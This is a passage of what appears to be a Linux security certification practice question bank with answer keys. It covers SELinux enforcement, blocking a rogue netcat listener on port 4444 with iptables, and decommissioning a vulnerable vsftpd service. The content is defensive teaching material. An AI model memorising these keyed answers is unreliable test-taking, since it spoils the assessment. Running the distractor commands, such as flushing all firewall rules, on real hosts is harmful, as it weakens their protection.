             "rationale": "Incorrect. This only loosens the permissions on the config file itself, making it "
                          "world-writable (a new risk), and does nothing to change SELinux's actual enforcement mode."},
        ],
        "explanation": (
            "SELinux has three modes: enforcing (blocks and logs violations), permissive (only logs, does not "
            "block — how this system was exploited), and disabled. setenforce 1 restores active enforcement "
            "immediately, and persisting the setting in /etc/selinux/config prevents reverting on reboot."
        ),
    },
    {
        "id": "tlnx-039",
        "domain": 2,
        "objective": "2.5",
        "type": "multiple_choice",
        "difficulty": "medium",
        "study_topic": "Mitigation techniques",
        "stem": (
            "Following discovery of the rogue netcat listener on TCP port 4444 from an earlier investigation, "
            "the team wants an immediate, host-based mitigation to block any future inbound connection attempts "
            "to that port while the underlying malware is still being fully removed. Which command applies this "
            "mitigation using the host firewall?"
        ),
        "options": [
            {"id": "a", "text": "iptables -A INPUT -p tcp --dport 4444 -j DROP", "correct": True,
             "rationale": "Correct. This appends a rule to the INPUT chain that silently drops any inbound TCP "
                          "traffic destined for port 4444, immediately blocking new connection attempts to the "
                          "rogue listener at the host firewall level."},
            {"id": "b", "text": "iptables -A OUTPUT -p tcp --dport 22 -j DROP", "correct": False,
             "rationale": "Incorrect. This blocks outbound SSH traffic on port 22, an unrelated port and "
                          "direction; it does nothing to stop inbound connections to the malicious listener on port 4444."},
            {"id": "c", "text": "ss -tulpn | grep 4444", "correct": False,
             "rationale": "Incorrect. This only displays the listening socket information; it is a detection/"
                          "confirmation step and applies no blocking mitigation whatsoever."},
            {"id": "d", "text": "iptables -F", "correct": False,
             "rationale": "Incorrect. Flushing all iptables rules removes existing firewall protections "
                          "entirely, which would make the host more exposed, not less, and does not specifically "
                          "block port 4444."},
        ],
        "explanation": (
            "Adding a targeted iptables DROP rule for the specific port (INPUT chain, destination port 4444) is "
            "a quick host-based mitigation that blocks new inbound connections to a known-malicious listener "
            "while eradication of the underlying process/persistence continues."
        ),
    },
    {
        "id": "tlnx-040",
        "domain": 2,
        "objective": "2.5",
        "type": "multiple_choice",
        "difficulty": "medium",
        "study_topic": "Mitigation techniques",
        "stem": (
            "A vulnerability scan cross-referenced with journalctl shows an outdated, internet-facing 'vsftpd' "
            "service with a known critical CVE is running on a Linux server and is not required for any current "
            "business function. What is the most appropriate mitigation?"
        ),
        "options": [
            {"id": "a", "text": "systemctl stop vsftpd && systemctl disable vsftpd (remove or uninstall the package if truly unneeded)", "correct": True,
             "rationale": "Correct. Since the vulnerable service serves no business need, the correct mitigation "
                          "is to reduce attack surface by stopping and permanently disabling (or removing) it "
                          "entirely, eliminating the exposed vulnerable code path."},
            {"id": "b", "text": "chmod 700 /usr/sbin/vsftpd", "correct": False,
             "rationale": "Incorrect. Restricting execute permission to root does not stop the already-running "
                          "service or prevent it from restarting via systemd, and the service would still be "
                          "listening and vulnerable while running."},
            {"id": "c", "text": "Add a cron job to restart vsftpd every hour to ensure availability", "correct": False,
             "rationale": "Incorrect. This keeps the vulnerable, unneeded service running and actively ensures "
                          "its continued exposure, which is the opposite of appropriate mitigation."},
            {"id": "d", "text": "Rename the vsftpd binary so vulnerability scanners can no longer detect it", "correct": False,
             "rationale": "Incorrect. Renaming the binary is security through obscurity; it does not patch or "
                          "remove the vulnerable code, and the service remains exploitable by anyone who finds "
                          "the open port regardless of the binary's file name."},
        ],
        "explanation": (
            "When a vulnerable service has no legitimate business need, the strongest mitigation is decommissioning "
            "it — stopping, disabling, and ideally uninstalling it — which permanently removes the attack "
            "surface rather than merely disguising or restricting access to it."
        ),
    },
]
